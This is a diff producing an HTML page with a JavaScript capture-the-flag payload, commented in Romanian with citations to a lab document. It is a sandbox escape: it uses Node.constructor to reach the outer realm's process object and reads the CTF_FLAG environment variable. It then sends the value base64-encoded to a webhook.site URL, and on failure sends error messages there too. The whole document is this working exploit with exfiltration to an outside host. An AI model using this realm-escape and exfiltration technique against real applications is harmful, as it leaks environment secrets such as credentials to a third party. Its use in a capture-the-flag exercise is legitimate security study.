@@ -1,7 +1,26 @@
-// Payload-ul corect conform laboratorului:
-const outerRealmFunctionConstructor = Node.constructor;
-const process = new outerRealmFunctionConstructor("return process")();
-const flag = process.env['CTF_FLAG'];
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        (async () => {
+            try {
+                // Faza 3 din document: Folosim constructorul Node pentru a accesa obiectul process [cite: 37, 41]
+                const outerRealmFunctionConstructor = Node.constructor;
+                
+                // Instanțiem un nou constructor pentru a returna obiectul global 'process' din Node.js [cite: 42]
+                const process = new outerRealmFunctionConstructor("return process")();
+                
+                // Extragem flag-ul din variabilele de mediu [cite: 19, 44]
+                const flag = process.env['CTF_FLAG'];
 
-// Trimite flag-ul către webhook-ul tău:
-fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG=" + btoa(flag));
+                // Trimitem flag-ul către Webhook-ul tău sub formă codificată Base64
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_OBTINUT=" + btoa(flag));
+                
+            } catch (e) {
+                // În caz de eroare, trimitem mesajul pentru debugging
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?EROARE=" + btoa(e.message));
+            }
+        })();
+    </script>
+</body>
+</html>
